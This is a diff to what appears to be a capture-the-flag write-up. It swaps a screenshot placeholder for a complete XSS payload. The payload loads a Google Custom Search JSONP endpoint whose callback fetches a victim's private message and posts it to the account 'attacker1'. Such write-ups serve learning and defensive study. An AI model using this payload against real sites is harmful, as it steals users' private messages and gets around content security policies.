@@ -104,10 +104,9 @@ deterministically the letter I wanted, no discovery step needed.
 
 So the payload just does two fetches, no loops, no regex, no comparison
 operators at all:
-
-> *(screenshot of the payload from VS Code goes here)*
->
-> ![vscode payload screenshot](vs_code_messagold.png)
+```
+<script src="https://www.googleapis.com/customsearch/v1?callback=fetch('%2Fmessages%2F1').then(function(r)%7Breturn%20r.text()%7D).then(function(t)%7Bfetch('%2Fmessages'%2C%7Bmethod%3A'POST'%2Cheaders%3A%7B'Content-Type'%3A'application%2Fx-www-form-urlencoded'%7D%2Cbody%3A'to_username%3Dattacker1%26content%3D'%2BencodeURIComponent(t)%7D)%7D)%3Bignored"></script>
+```
 
 Decoded, it reads:
 
